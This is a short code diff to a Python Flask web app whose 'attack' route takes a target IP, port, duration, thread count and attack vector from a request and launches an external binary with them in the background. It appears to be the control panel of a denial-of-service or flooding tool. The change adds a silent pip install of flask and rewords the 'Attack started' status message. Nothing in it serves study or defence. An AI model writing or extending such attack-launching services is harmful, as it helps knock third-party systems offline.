@@ -1,5 +1,10 @@
 import os
 import subprocess
+import sys
+
+# Auto install flask
+os.system(f'{sys.executable} -m pip install flask --quiet')
+
 from flask import Flask, request
 
 app = Flask(__name__)
@@ -15,7 +20,7 @@ def attack():
     
     cmd = [BINARY, ip, port, time, threads, vector]
     subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    return f"Attack started on {ip}:{port} for {time}s with {threads} threads"
+    return f"Started: {ip}:{port} | {time}s | {threads} threads | vector {vector}"
 
 if __name__ == '__main__':
     os.system('chmod +x *')
